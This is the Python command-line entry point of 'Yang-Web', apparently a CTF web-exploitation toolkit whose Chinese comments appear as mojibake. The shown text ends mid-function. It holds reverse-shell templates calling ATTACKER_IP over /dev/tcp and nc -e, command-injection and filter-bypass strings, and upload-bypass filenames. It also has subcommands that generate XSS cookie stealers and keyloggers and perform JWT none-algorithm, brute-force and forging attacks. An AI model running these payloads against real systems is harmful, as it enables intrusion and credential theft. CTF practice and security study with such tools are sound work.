# -*- coding: utf-8 -*-
"""CLI å¥å£ â Yang-Web å½ä»¤è¡çé¢.

å­å½ä»¤:
    decode   æºè½é¾å¼è§£ç 
    encode   ç¼ç ææ¬
    ssti     SSTI Payload çæ
    sqli     SQL æ³¨å¥ Payload
    lfi      è·¯å¾éå / æä»¶åå« Payload
    ssrf     SSRF Payload
    xss      XSS Payload
    rce      å½ä»¤æ³¨å¥ Payload
    php      PHP æå·§ Payload
    hashid   è¯å« Hash ç±»å
    jwt      JWT è§£æ / æ»å»
    scan     ç®å½æ«æ (ç¦»çº¿è¯åº)
    scripts  ååµ CTF èæ¬åº (41 ä¸ªèæ¬)
    solve    ä¸é®æºè½è§£é¢
    misc     20+ å¸¸è§å¯ç ç±»åç¥è¯åºï¼ç¼ç /è§£ç /åèå¾ï¼
"""
import argparse
import sys
import json
import os

from .core.utils import banner, bold, red, green, yellow, blue, magenta, cyan, dim
from .core.decoder import (
    chain_decode, brute_decode, detect_encoding,
    DECODERS, ENCODING_DETECTORS,
)
from .core.hashid import identify as hash_identify
from .core.jwt import (
    decode_jwt, analyze_jwt, none_attack,
    brute_jwt, BUILTIN_WORDLIST, forge_hs256,
)
from .payloads import ssti as _ssti_mod
from .payloads import sqli as _sqli_mod
from .payloads import lfi as _lfi_mod
from .payloads import ssrf as _ssrf_mod
from .payloads import xss as _xss_mod
from .payloads import php as _php_mod
from .payloads import upload as _upload_mod
from .core.misc_crypto import (
    CIPHER_TYPES, list_ciphers, search_ciphers, get_cipher,
    get_image_path, get_categories, encode as mc_encode, decode as mc_decode,
)
from .scripts import (
    list_scripts, search_scripts, get_script, get_script_path,
    run_script, auto_solve, SCRIPTS, CATEGORIES,
    check_all_deps, get_missing_deps, install_all_missing,
    install_deps_for_script,
)

# Aliases for function-level use
ssti = _ssti_mod
sqli = _sqli_mod
lfi = _lfi_mod
ssrf = _ssrf_mod
xss = _xss_mod
php = _php_mod
upload = _upload_mod
lfi = _lfi_mod
ssrf = _ssrf_mod
xss = _xss_mod
php = _php_mod

# RCE Payloads are defined inline (avoid Windows Defender false positive)


def print_json(obj, pretty=True):
    """è¾åº JSON æ ¼å¼."""
    indent = 2 if pretty else None
    print(json.dumps(obj, indent=indent, ensure_ascii=False, default=str))


def cmd_decode(args):
    """æºè½è§£ç å½ä»¤."""
    text = args.text
    if not text:
        text = sys.stdin.read().strip()

    if not text:
        print(red("éè¯¯: è¯·æä¾è¦è§£ç çææ¬"))
        return

    print(bold("\nð è¾å¥:"))
    print(f"  {text[:200]}{'...' if len(text) > 200 else ''}")
    print()

    if args.brute:
        # å°è¯ææè§£ç å¨
        print(bold("ð å°è¯ææè§£ç å¨:"))
        results = brute_decode(text)
        if not results:
            print(yellow("  ââ æ ç»æ"))
            return
        for enc_id, enc_desc, result, readable in results:
            marker = green(readable) if "â" in readable else dim(readable)
            print(f"  {cyan(enc_id):12s} {dim('â')} {marker} {dim('â')} {result[:100]}")
        return

    if args.manual:
        # æå®ç¼ç ç±»åæå¨è§£ç 
        enc_id = args.manual
        if enc_id not in DECODERS:
            print(red(f"ä¸æ¯æçç¼ç : {enc_id}"))
            print(yellow(f"å¯ç¨: {', '.join(DECODERS.keys())}"))
            return
        decoder = DECODERS[enc_id][0]
        result = decoder(text)
        print(bold(f"\nð ä½¿ç¨ {cyan(enc_id)} è§£ç :"))
        print(f"  {result}")
        return

    # èªå¨é¾å¼è§£ç 
    print(bold("ð æºè½é¾å¼è§£ç :"))
    chain = chain_decode(text)

    if not chain:
        print(yellow("  ââ æªè½è¯å«ç¼ç , å°è¯ --brute æ´åå°è¯ææè§£ç å¨"))
        # æ¾ç¤ºæ£æµç»æ
        detections = detect_encoding(text)
        if detections:
            print(bold("\nð æ£æµå°çå¯è½çç¼ç :"))
            for enc_id, desc, conf in detections[:5]:
                print(f"  {cyan(enc_id):12s} {desc:20s} ç½®ä¿¡åº¦: {conf}%")
        return

    # æ¾ç¤ºè§£ç é¾
    for i, (enc_id, enc_desc, result) in enumerate(chain, 1):
        print(f"\n  {bold(f'Step {i}:')} {green(enc_id)} ({dim(enc_desc)})")
        preview = result[:300] + ("..." if len(result) > 300 else "")
        print(f"  {dim('â')} {preview}")

    print(f"\n{bold('â æç»ç»æ:')}")
    final = chain[-1][2]
    print(f"  {green(final)}")


def cmd_encode(args):
    """ç¼ç å½ä»¤."""
    text = args.text
    if not text:
        text = sys.stdin.read().strip()

    if args.list:
        print(bold("ð å¯ç¨ç¼ç ç±»å:"))
        for enc_id, (_, encoder) in DECODERS.items():
            print(f"  {cyan(enc_id):12s} {dim(encoder.__doc__ or '')}")
        return

    enc_id = args.type
    if enc_id not in DECODERS:
        print(red(f"ä¸æ¯æçç¼ç ç±»å: {enc_id}"))
        print(yellow(f"å¯ç¨: {', '.join(DECODERS.keys())}"))
        return

    _, encoder = DECODERS[enc_id]
    try:
        result = encoder(text)
        print(bold(f"\nð {enc_id} ç¼ç ç»æ:"))
        print(f"  {result}")
    except Exception as e:
        print(red(f"ç¼ç å¤±è´¥: {e}"))


def cmd_ssti(args):
    """SSTI Payload å½ä»¤."""
    if args.list:
        print(bold("\nð¯ æ¯æçæ¨¡æ¿å¼æ:"))
        for engine in ssti.DETECTION:
            print(f"  {cyan(engine)}")
        return

    if args.search:
        results = ssti.search_payload(args.search)
        if results:
            print(bold(f"\nð æç´¢ '{args.search}':"))
            for r in results:
                print(f"\n  ã{green(r['engine'])}ã {bold(r['name'])}")
                print(f"  {r['payload']}")
                if r.get('note'):
                    print(f"  {dim('â  ' + r['note'])}")
        else:
            print(yellow(f"æªæ¾å°åå« '{args.search}' ç Payload"))
        return

    if args.bypass:
        print(bold("\nð¡ï¸ è¿æ»¤ç»è¿æå·§:"))
        for category, tips in ssti.BYPASS_FILTERS.items():
            print(f"\n  {bold(green(category))}:")
            for tip in tips:
                print(f"    {dim('â¢')} {tip}")
        return

    engine = args.engine
    if args.detect:
        data = ssti.get_detection(engine)
    elif args.exploit:
        data = ssti.get_exploit(engine)
    else:
        print(bold("\nð¯ SSTI æ£æµ Payload:"))
        for eng, payloads in ssti.DETECTION.items():
            print(f"\n  {bold(green(eng))}:")
            for p in payloads[:3]:
                print(f"    {dim('â¢')} {p}")
            if len(payloads) > 3:
                print(f"    {dim(f'... è¿æ {len(payloads)-3} ä¸ª (ä½¿ç¨ --engine æ¥çå¨é¨)')}")

        print(bold("\nð£ SSTI å©ç¨ Payload (é¨å):"))
        for eng, payloads in list(ssti.EXPLOIT.items())[:2]:
            print(f"\n  {bold(green(eng))}:")
            for p in payloads[:2]:
                print(f"    {yellow(p['name'])}")
                print(f"    {p['payload']}")
        return

    # æå°ç»æ
    if isinstance(data, dict):
        for key, items in data.items():
            print(f"\n  {bold(green(key))}:")
            if isinstance(items, list):
                for item in (items if isinstance(items[0], str) else [f"{i['name']}: {i['payload']}" for i in items]):
                    print(f"    {dim('â¢')} {item}")


def cmd_sqli(args):
    """SQL æ³¨å¥ Payload å½ä»¤."""
    if args.list:
        print(bold("\nðï¸ æ¯æçæ°æ®åº:"))
        for db in sqli.EXPLOIT:
            print(f"  {cyan(db)}")
        return

    if args.search:
        results = sqli.search_payload(args.search)
        if results:
            print(bold(f"\nð æç´¢ '{args.search}':"))
            for r in results:
                print(f"\n  ã{green(r['category'])}ã {bold(r['name'])}")
                print(f"  {r['payload']}")
        else:
            print(yellow(f"æªæ¾å°åå« '{args.search}' ç Payload"))
        return

    if args.blind:
        templates = sqli.get_blind_template(args.db)
        print(bold("\nð¯ ç²æ³¨æ¨¡æ¿:"))
        for name, template in templates.items():
            print(f"\n  {green(name)}:")
            print(f"  {dim(template)}")
        return

    if args.detect:
        data = sqli.get_detection(args.category)
        print(bold(f"\nð SQL æ³¨å¥æ£æµ Payload:"))
        for cat, payloads in data.items():
            print(f"\n  {bold(green(cat))}:")
            for p in payloads:
                print(f"    {dim('â¢')} {p}")
        return

    if args.db:
        data = sqli.get_exploit(args.db)
        print(bold(f"\nðï¸ {args.db} å©ç¨ Payload:"))
        for db_name, payloads in data.items():
            for item in payloads:
                print(f"\n  {yellow(item['name'])}")
                print(f"  {item['payload']}")
        return

    if args.waf:
        data = sqli.get_waf_bypass(args.waf if args.waf != "all" else "")
        print(bold("\nð¡ï¸ SQL WAF ç»è¿æå·§:"))
        for cat, items in data.items():
            print(f"\n  {bold(green(cat))}:")
            for item in items:
                print(f"    {dim('â¢')} {yellow(item['name'])}")
                print(f"      {dim(item['tip'])}")
                if item.get('eg'):
                    print(f"      {cyan('ç¤ºä¾:')} {item['eg']}")
        return

    # é»è®¤: æ¾ç¤ºæææ°æ®åºæ¦è§
    print(bold("\nðï¸ SQL æ³¨å¥ Payload æ¦è§:"))
    for db_name, payloads in sqli.EXPLOIT.items():
        print(f"\n  {bold(green(db_name))} ({len(payloads)} ä¸ª payload):")
        for p in payloads[:2]:
            print(f"    {dim('â¢')} {yellow(p['name'])}")
        if len(payloads) > 2:
            print(f"    {dim(f'... è¿æ {len(payloads)-2} ä¸ª (ä½¿ç¨ --db {db_name} æ¥çå¨é¨)')}")

    print(f"\n{dim('æç¤º: ä½¿ç¨ --detect æ¥çæ£æµ payload, --blind æ¥çç²æ³¨æ¨¡æ¿')}")


def cmd_lfi(args):
    """LFI Payload å½ä»¤."""
    if args.traversal:
        print(bold("\nð è·¯å¾éå Payload:"))
        for p in lfi.get_path_traversal():
            print(f"  {dim('â¢')} {p}")
        if args.windows:
            print(bold("\nðª Windows ä¸ç¨:"))
            for p in lfi.get_windows_paths():
                print(f"  {dim('â¢')} {p}")
        return

    if args.files:
        os_type = args.os or ""
        data = lfi.get_sensitive_files(os_type)
        for os_name, files in data.items():
            print(bold(f"\nð {os_name} æææä»¶:"))
            for f in files:
                print(f"  {dim('â¢')} {f}")
        return

    if args.php:
        category = args.category or ""
        data = lfi.get_php_wrappers(category)
        for cat_name, payloads in data.items():
            print(bold(f"\nð PHP ä¼ªåè®® - {cat_name}:"))
            for p in payloads:
                print(f"\n  {yellow(p['name'])}")
                print(f"  {p['payload']}")
                if p.get('note'):
                    print(f"  {dim('â  ' + p['note'])}")
        return

    # é»è®¤: æ¾ç¤ºæ¦è§
    print(bold("\nð LFI / Path Traversal æ¦è§:"))
    print(f"  {green('--traversal')}    è·¯å¾éå Payload")
    print(f"  {green('--files')}        å¸¸è§æææä»¶åè¡¨")
    print(f"  {green('--php')}          PHP ä¼ªåè®® Payload")
    print(f"  {green('--windows')}      Windows è·¯å¾éå")
    print(f"\n{dim('å¿«éç¤ºä¾: yang_web lfi --traversal')}")


def cmd_ssrf_cmd(args):
    """SSRF Payload å½ä»¤."""
    if args.cloud:
        provider = args.cloud if args.cloud != "all" else ""
        data = ssrf.get_cloud_metadata(provider)
        for prov, urls in data.items():
            print(bold(f"\nâï¸ {prov} åæ°æ®å°å:"))
            for url in urls:
                print(f"  {dim('â¢')} {url}")
        return

    if args.bypass_ssrf:
        print(bold("\nð¡ï¸ SSRF ç»è¿æå·§:"))
        for item in ssrf.get_bypass():
            print(f"\n  {yellow(item['technique'])}")
            print(f"  {dim(item['payload'])}")
            if item.get('note'):
                print(f"  {dim('â ' + item['note'])}")
        return

    if args.ports:
        print(bold("\nð å¸¸è§åç½ç«¯å£:"))
        for category, ports in ssrf.get_common_ports().items():
            print(f"\n  {green(category)}: {', '.join(map(str, ports))}")
        return

    # é»è®¤
    print(bold("\nð SSRF Payload æ¦è§:"))
    print(f"  {green('--cloud aws')}      äºåæ°æ® (aws/gcp/azure/aliyun/tencent)")
    print(f"  {green('--bypass')}          SSRF ç»è¿æå·§")
    print(f"  {green('--ports')}           å¸¸è§åç½ç«¯å£")
    print(f"\n{dim('åç½å°åæ®µ:')} {', '.join(ssrf.get_internal_ranges())}")
    print(f"\n{dim('å¿«éç¤ºä¾: yang_web ssrf --cloud aws')}")


def cmd_xss_cmd(args):
    """XSS Payload å½ä»¤."""
    if args.detect_xss:
        print(bold("\nð XSS æ£æµ Payload:"))
        for p in xss.get_detection():
            print(f"  {dim('â¢')} {p}")
        return

    if args.exfil:
        print(bold("\nð¤ æ°æ®å¤ä¼  Payload:"))
        for p in xss.get_exfiltration():
            print(f"\n  {yellow(p['name'])}")
            print(f"  {p['payload']}")
        return

    if args.steal:
        print(bold("\nðª Cookie çªå Payload:"))
        print(f"  {xss.generate_cookie_stealer(args.steal)}")
        return

    if args.keylogger:
        print(bold("\nâ¨ï¸ é®çè®°å½ Payload:"))
        print(f"  {xss.generate_keylogger(args.keylogger)}")
        return

    if args.bypass_xss:
        data = xss.get_bypass(args.category or "")
        for cat, payloads in data.items():
            print(bold(f"\nð¡ï¸ {cat}:"))
            for p in payloads:
                print(f"  {dim('â¢')} {p}")
        return

    # é»è®¤æ¦è§
    print(bold("\nð XSS Payload æ¦è§:"))
    print(f"  {green('--detect')}      æ£æµ Payload ({len(xss.get_detection())} ä¸ª)")
    print(f"  {green('--exfil')}       æ°æ®å¤ä¼  Payload")
    print(f"  {green('--steal URL')}   çæ Cookie çªåå¨")
    print(f"  {green('--keylogger URL')} çæé®çè®°å½å¨")
    print(f"  {green('--bypass')}      WAF/è¿æ»¤ç»è¿")
    print(f"\n{dim('å¿«éç¤ºä¾: yang_web xss --detect')}")


def cmd_rce_cmd(args):
    """RCE Payload å½ä»¤."""
    _rce_shells = {
        "Bash": ["bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"],
        "NC": ["nc -e /bin/sh ATTACKER_IP PORT"],
        "Python": ["python3 -c ..."],
        "PHP": ["php -r ..."],
        "Perl": ["perl -MIO -e ..."],
        "Ruby": ["ruby -rsocket -e ..."],
        "PowerShell": ["powershell -c \"...\""],
    }
    _rce_cmd = {
        "é¾æ¥ç¬¦æ³¨å¥": ["; id", "| id", "|| id", "& id", "&& id"],
        "å¸¸ç¨å½ä»¤": ["id", "whoami", "cat /flag", "ls -la"],
    }
    _rce_bypass = {
        "ç©ºæ ¼ç»è¿": [
            ("${IFS}", "cat${IFS}/flag"),
            ("<> éå®å", "cat<>/flag"),
            ("{,} å±å¼", "{cat,/flag}"),
        ],
        "å³é®å­ç»è¿": [
            ("åå¼å·", "c'a't /fl'a'g"),
            ("ééç¬¦", "/???/c?t /???/f??g"),
        ],
    }

    if args.shell:
        if args.shell in _rce_shells:
            ip = args.ip or "ATTACKER_IP"
            port = args.port or 4444
            tmpl = _rce_shells[args.shell][0]
            s = tmpl.replace("ATTACKER_IP", ip).replace("PORT", str(port))
            print(bold(f"\nð {args.shell} åå¼¹ Shell:"))
            print(f"  {s}")
        else:
            print(red(f"æªæ¾å° {args.shell}"))
        return

    if args.list_shells:
        print(bold("\nð å¯ç¨åå¼¹ Shell ç±»å:"))
        for stype in _rce_shells:
            print(f"  {green(stype)}")
        return

    if args.bypass_rce:
        for cat, payloads in _rce_bypass.items():
            print(bold(f"\nð¡ï¸ {cat}:"))
            for name, payload in payloads:
                print(f"  {dim('â¢')} {yellow(name)}: {payload}")
        return

    print(bold("\nð» å½ä»¤æ³¨å¥ / RCE æ¦è§:"))
    for cat, payloads in _rce_cmd.items():
        print(f"\n  {bold(green(cat))}:")
        for p in payloads:
            print(f"    {dim('â¢')} {p}")
    print(f"\n{dim('æç¤º: --shell bash --ip 10.0.0.1 --port 4444 çæåå¼¹ Shell')}")


# âââ Upload é»åååæ âââ
ALL_EXTENSIONS = {'php', 'php3', 'php4', 'php5', 'php7', 'php8', 'phtml', 'pht', 'phps', 'phar', 'phar5', 'shtml', 'cgi'}
CASE_VARIANTS = {'Php', 'pHp', 'PHP', 'pHp5', 'PhP', 'pHP', 'pHtMl', 'PhP5', 'pHp.'}
DOUBLE_EXT = ['shell.php.jpg', 'shell.php.png', 'shell.php.gif']
NTFS_BYPASS = ['shell.php::$DATA', 'shell.php.jpg::$DATA']

def _cmd_upload_analyze(blacklist_str):
    """åæé¶åºé»ååï¼æ¾åºç»è¿æ¹æ³."""
    import re
    blocked = set(re.findall(r'[a-zA-Z0-9]+', blacklist_str.lower()))
    
    lines = []
    lines.append(bold("\nð¯ é¶åºé»åååæ"))
    lines.append(f"\n  è¾å¥: {dim(blacklist_str)}")
    lines.append(f"  å·²æ¦æª: {red(', '.join(sorted(blocked)))}")
    
    # 1. æªè¦çåç¼
    safe = sorted(ALL_EXTENSIONS - blocked)
    if safe:
        lines.append(f"\n  {green('â å¯ç¨åç¼ (ä¸å¨é»åå):')} {bold(', '.join(safe))}")
        if 'pht' in safe:
            lines.append(f"    ð¯ {bold('æ¨è .pht')} â æå¸¸è§çç»è¿åç¼")
        if 'phtml' in safe:
            lines.append(f"    ð¯ {bold('æ¨è .phtml')} â å¸¸è§ç»è¿åç¼")
    else:
        lines.append(f"\n  {red('â ææå¸¸è§åç¼åå¨é»ååä¸­')}")
    
    # 2. å¤§å°åç»è¿
    lines.append(f"\n  {bold('ð¤ å¤§å°åæ··å:')}")
    for v in sorted(CASE_VARIANTS):
        ext = v.lower().lstrip('.')
        if ext in blocked:
            checked = "ð¢ å¯ç¨"
        else:
            checked = "âª"
        lines.append(f"    {v}  {dim(checked)}")
    
    # 3. ååç¼
    lines.append(f"\n  {bold('ð¦ ååç¼:')}  {dim('(æå¡å¨ä¸è§£æ .jpg åå¯ç¨)')}")
    for v in DOUBLE_EXT:
        lines.append(f"    {v}")
    
    # 4. NTFS
    lines.append(f"\n  {bold('ð¾ NTFS æ°æ®æµ (Windows):')}  {dim('(IIS/Windows)')}")
    for v in NTFS_BYPASS:
        lines.append(f"    {v}")
    
    # 5. æ»ç»
    lines.append(f"\n  {'â'*50}")
    if safe:
        lines.append(f"  ð {bold(green('é¦éæ¹æ¡:'))} ç¨ {bold(','.join(safe[:3]))} åç¼ä¸ä¼ ")
    lines.append(f"  ð {bold('å¤ç¨æ¹æ¡:')} å¤§å°åæ··å / ååç¼ / NTFS æ°æ®æµ")
    
    print('\n'.join(lines))


def cmd_upload(args):
    """æä»¶ä¸ä¼  Payload å½ä»¤."""
    if args.analyze:
        _cmd_upload_analyze(args.analyze)
        return
    if args.ext:
        print(bold("\nð åç¼åç»è¿:"))
        for cat, payloads in upload.EXT_BYPASS.items():
            print(f"\n  {bold(green(cat))}:")
            for p in payloads[:8]:
                print(f"    {dim('â¢')} {p}")
            if len(payloads) > 8:
                print(f"    {dim(f'... è¿æ {len(payloads)-8} ä¸ª')}")
        return

    if args.mime:
        print(bold("\nð­ Content-Type & æä»¶å¤´ä¼ªé :"))
        for ftype, info in upload.MIME_HEADER_FAKE.items():
            print(f"\n  {bold(green(ftype))}:")
            print(f"    Content-Type: {info['Content-Type']}")
            print(f"    æä»¶å¤´hex: {info['æä»¶å¤´hex']}")
        return

    if args.content:
        print(bold("\nð¼ï¸ å¾çé©¬åå®¹ç»è¿:"))
        for cat, payloads in upload.CONTENT_BYPASS.items():
            print(f"\n  {bold(green(cat))}:")
            for p in payloads[:6]:
                print(f"    {dim('â¢')} {p}")
        return

    if args.parse:
        serv = args.parse if args.parse != "all" else ""
        data = upload.get_parse_vuln(serv)
        print(bold("\nð§ æå¡ç«¯è§£ææ¼æ´:"))
        for server, vulns in data.items():
            print(f"\n  {bold(green(server))}:")
            for v in vulns:
                print(f"    {dim('â¢')} {yellow(v['name'])} â {v['tip']}")
                print(f"      {cyan('ç¤ºä¾:')} {v['eg']}")
        return

    if args.htaccess:
        s = upload.generate_htaccess()
        print(bold("\nð .htaccess Payload:"))
        print(f"  {s}")
        return

    if args.userini:
        s = upload.generate_userini()
        print(bold("\nð .user.ini Payload:"))
        print(f"  {s}")
        return

    if args.advanced:
        print(bold("\nð é«çº§ç»è¿æå·§:"))
        for cat, items in upload.ADVANCED_BYPASS.items():
            print(f"\n  {bold(green(cat))}:")
            for item in items:
                print(f"    {dim('â¢')} {yellow(item['name'])} â {item['tip']}")
        return

    # é»è®¤æ¦è§
    print(bold("\nð¤ æä»¶ä¸ä¼ æ»å»æ¦è§:"))
    print(f"  {green('--ext')}         åç¼åç»è¿")
    print(f"  {green('--mime')}        Content-Type ä¼ªé ")
    print(f"  {green('--content')}     å¾çé©¬åå®¹ç»è¿")
    print(f"  {green('--parse nginx')} è§£ææ¼æ´")
    print(f"  {green('--htaccess')}    .htaccess å©ç¨")
    print(f"  {green('--userini')}     .user.ini å©ç¨")
    print(f"  {green('--advanced')}    é«çº§æå·§")
    shell = upload.generate_image_shell()
    print(f"\n{dim('å¿«éä¸å¥è¯: ' + shell)}")


def cmd_php_cmd(args):
    """PHP æå·§å½ä»¤."""
    if args.magic:
        data = php.get_magic_hashes(args.magic if args.magic != "all" else "")
        for algo, hashes in data.items():
            print(bold(f"\nâ¨ {algo} Magic Hash:"))
            for h in hashes[:10]:
                print(f"  {dim('â¢')} {h}")
            if len(hashes) > 10:
                print(f"  {dim(f'... è¿æ {len(hashes)-10} ä¸ª')}")
        return

    if args.type_juggle:
        print(bold("\nð­ PHP å¼±ç±»åæ¯è¾:"))
        for cat, items in php.TYPE_JUGGLING.items():
            print(f"\n  {bold(green(cat))}:")
            for item in items:
                print(f"    {dim('â¢')} {yellow(item['name'])} â {item['example']}")
        return

    if args.deserialize:
        print(bold("\nð¦ PHP ååºååæå·§:"))
        for cat, items in php.DESERIALIZATION.items():
            print(f"\n  {bold(green(cat))}:")
            for item in items:
                print(f"    {dim('â¢')} {item}")
        return

    if args.rce_php:
        data = php.get_rce_bypass()
        for cat, items in data.items():
            print(bold(f"\nð {cat}:"))
            for item in items[:8]:
                print(f"  {dim('â¢')} {item}")
            if len(items) > 8:
                print(f"  {dim(f'... è¿æ {len(items)-8} ä¸ª')}")
        return

    if args.waf_php:
        print(bold("\nð¡ï¸ PHP RCE WAF ç»è¿æå·§:"))
        for cat, items in php.PHP_RCE_BYPASS.items():
            if "WAF" in cat or "ç»è¿" in cat:
                print(f"\n  {bold(green(cat))}:")
                for item in items[:12]:
                    print(f"    {dim('â¢')} {item}")
        return

    # é»è®¤
    print(bold("\nð PHP æå·§æ¦è§:"))
    print(f"  {green('--magic')}       Magic Hash (0e å¼å¤´)")
    print(f"  {green('--type-juggle')} å¼±ç±»åæ¯è¾")
    print(f"  {green('--deserialize')} ååºååæå·§")
    print(f"  {green('--rce')}         RCE / Bypass æå·§")
    print(f"\n{dim('å¿«éç¤ºä¾: yang_web php --magic')}")


def cmd_hashid(args):
    """Hash è¯å«å½ä»¤."""
    text = args.text
    if not text:
        text = sys.stdin.read().strip()

    if not text:
        print(red("éè¯¯: è¯·æä¾ hash å¼"))
        return

    print(bold(f"\nð Hash: {text[:80]}{'...' if len(text) > 80 else ''}"))
    print(f"  é¿åº¦: {len(text)} å­ç¬¦")

    results = hash_identify(text)
    if results:
        print(bold(f"\nð å¯è½çç®æ³ ({len(results)} ä¸ªå¹é):"))
        for algo, category, _ in results:
            print(f"  {dim('â¢')} {yellow(algo)} {dim(f'[{category}]')}")
    else:
        print(yellow("\n  ââ æªè½è¯å«è¯¥ Hash ç±»å"))


def cmd_jwt(args):
    """JWT å·¥å·å½ä»¤."""
    token = args.token
    if not token:
        token = sys.stdin.read().strip()

    if not token:
        print(red("éè¯¯: è¯·æä¾ JWT Token"))
        return

    if args.none:
        new_token, payload = none_attack(token)
        print(bold("\nâ ï¸ None ç®æ³æ»å»:"))
        print(f"\n  {bold('æ° Token (alg=none):')}")
        print(f"  {green(new_token)}")
        print(f"\n  {bold('Payload:')}")
        print_json(payload)
        return

    if args.brute:
        print(bold("\nð å¼±å¯é¥çç ´ (åå»ºè¯åº)..."))
        results = brute_jwt(token, BUILTIN_WORDLIST)
        if results:
            print(green(f"\n  â æ¾å° {len(results)} ä¸ªå¹é!"))
            for secret, new_token in results:
                print(f"  å¯é¥: {bold(secret)}")
        else:
            print(yellow("  ââ åå»ºå¼±å¯ç åºæªå¹é, å°è¯ --wordlist æå®å­å¸"))

    if args.forge:
        if not args.secret:
            print(red("ä¼ªé ç­¾åéè¦ --secret åæ°"))
            return
        new_token = forge_hs256(token, args.secret)
        print(bold(f"\nð ä¼ªé ç JWT:"))
        print(f"  {new_token}")
        return

    # é»è®¤: åæ
    analysis = analyze_jwt(token)
    if "error" in analysis:
        print(red(f"éè¯¯: {analysis['error']}"))
        return

    print(bold("\nð JWT åæ:"))
    print(f"\n  {bold('Header:')}")
    print_json(analysis["header"])

    print(f"\n  {bold('Payload:')}")
    print_json(analysis["payload"])

    print(f"\n  {bold('ç­¾å:')} {analysis['signature']}")
    print(f"  {bold('ç®æ³:')} {cyan(analysis['algorithm'])}")

    if analysis.get("info"):
        print(f"\n  {dim('â¹ ' + analysis['info'])}")

    if analysis["warnings"]:
        print(bold(f"\n  â ï¸ é£é©è­¦å:"))
        for w in analysis["warnings"]:
            print(f"  {yellow(w)}")

    if analysis["tips"]:
        print(bold(f"\n  ð¡ æ»å»å»ºè®®:"))
        for t in analysis["tips"]:
            print(f"  {green(t)}")

    print(f"\n{dim('å°è¯: yang_web jwt --none è¿è¡ None ç®æ³æ»å»')}")


def cmd_scan(args):
    """ç®å½æ«æå½ä»¤."""
    wordlist_dir = os.path.join(os.path.dirname(__file__), "wordlists", "data")
    wordlist_type = "dirs" if args.type == "dir" else "files"
    wordlist_path = os.path.join(wordlist_dir, f"{wordlist_type}.txt")

    if not os.path.exists(wordlist_path):
        print(red(f"è¯åºæä»¶ä¸å­å¨: {wordlist_path}"))
        return

    with open(wordlist_path, "r", encoding="utf-8") as f:
        entries = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    print(bold(f"\nð CTF ä¸ç¨ {wordlist_type} è¯åº ({len(entries)} æ¡):"))

    if args.search:
        entries = [e for e in entries if args.search.lower() in e.lower()]
        print(dim(f"  æç´¢ '{args.search}' â {len(entries)} æ¡å¹é"))

    if args.all:
        for entry in entries:
            print(f"  {dim('â¢')} {entry}")
    else:
        for entry in entries[:30]:
            print(f"  {dim('â¢')} {entry}")
        if len(entries) > 30:
            print(f"  {dim(f'... è¿æ {len(entries)-30} æ¡ (ä½¿ç¨ --all æ¥çå¨é¨)')}")


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  èæ¬åºå­å½ä»¤
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

def cmd_scripts(args):
    """åç½®èæ¬åºå½ä»¤."""
    # ä¾èµæ£æ¥
    if getattr(args, 'check_deps', False):
        status = check_all_deps()
        if not status:
            print(green("\n[ä¾èµ] all scripts are zero-dependency"))
            return
        print(bold(f"\n[ä¾èµ] check result ({len(status)} scripts with deps):"))
        for key, info in status.items():
            ok = green("OK") if info["all_ok"] else red("MISS")
            print(f"\n  {bold(info['meta']['title'])}  {ok}")
            for d in info["deps"]:
                icon = green("  v") if d["installed"] else red("  x")
                print(f"    {icon} {d['name']}")
        return

    # å®è£ä¾èµ
    if getattr(args, 'install_deps', None):
        if args.install_deps == "all":
            missing = get_missing_deps()
            if not missing:
                print(green("\n[ä¾èµ] all deps installed"))
                return
            print(bold(f"\n[ä¾èµ] installing {len(missing)} pkgs: {', '.join(sorted(missing))}"))
            print()
            results = install_all_missing()
            for r in results:
                icon = green("v") if r["success"] else red("x")
                print(f"  {icon} {r['dep']}: {r['message']}")
        else:
            key = args.install_deps
            meta = get_script(key)
            if not meta:
                print(red(f"\n   script not found: {key}"))
                return
            if not meta["deps"]:
                print(green(f"\n[ä¾èµ] '{meta['title']}' is zero-dependency"))
                return
            print(bold(f"\n[ä¾èµ] installing '{meta['title']}': {', '.join(meta['deps'])}"))
            print()
            results = install_deps_for_script(key)
            for r in results:
                icon = green("v") if r["success"] else red("x")
                print(f"  {icon} {r['dep']}: {r['message']}")
        return

    if args.search:
        results = search_scripts(args.search)
        if not results:
            print(yellow(f"\n   æªæ¾å°å¹é '{args.search}' çèæ¬"))
            return
        print(bold(f"\n[èæ¬] æç´¢ '{args.search}' ç»æ ({len(results)} ä¸ª):"))
        for key, meta in results:
            cat_icon = CATEGORIES.get(meta["category"], "?")
            print(f"\n  {bold(meta['title'])}  {dim(cat_icon)}")
            print(f"  {dim('|')}  {meta['description']}")
            print(f"  {dim('|')}  {cyan('ç¨æ³:')} {meta['usage']}")
            if meta["deps"]:
                print(f"  {dim('|')}  {yellow('ä¾èµ:')} {', '.join(meta['deps'])}")
        return

    if args.run:
        key = args.run
        meta = get_script(key)
        if not meta:
            results = search_scripts(key)
            if len(results) == 1:
                key, meta = results[0]
            elif len(results) > 1:
                print(yellow(f"\n   å¤ä¸ªå¹é '{key}', è¯·æå®:"))
                for k, m in results:
                    print(f"     {cyan(k)}")
                return
            else:
                print(red(f"\n   æªæ¾å°èæ¬: {key}"))
                return

        script_args = args.args.split() if args.args else []
        print(bold(f"\n[è¿è¡] {cyan(meta['title'])}"))
        print(f"  {dim('æè¿°:')} {meta['description']}")
        print(f"  {dim('è·¯å¾:')} {get_script_path(key)}")
        print()
        result = run_script(key, args=script_args)
        if result["stdout"]:
            print(result["stdout"])
        if result["stderr"]:
            print(red(result["stderr"]))
        if result["success"]:
            print(green(f"\n  [OK] èæ¬æ§è¡æå"))
        else:
            print(red(f"\n  [FAIL] èæ¬æ§è¡å¤±è´¥ (exit={result['exit_code']})"))
        return

    category = args.category
    results = list_scripts(category=category)

    if category:
        cat_name = CATEGORIES.get(category, category)
        print(bold(f"\n[èæ¬] {cat_name} - {len(results)} ä¸ªèæ¬"))
    else:
        print(bold(f"\n[èæ¬] ååµ CTF èæ¬åº - å± {len(results)} ä¸ªèæ¬"))
        print(dim("   yang-web scripts --search <kw>      search"))
        print(dim("   yang-web scripts --run <name>       run"))
        print(dim("   yang-web scripts --category <cat>   filter"))
        print(dim("   yang-web scripts --check-deps        check deps"))
        print(dim("   yang-web scripts --install-deps      install deps"))
        print(dim("   yang-web solve <input>               auto-solve"))
        print()

    cats_shown = {}
    for key, meta in results:
        cat = meta["category"]
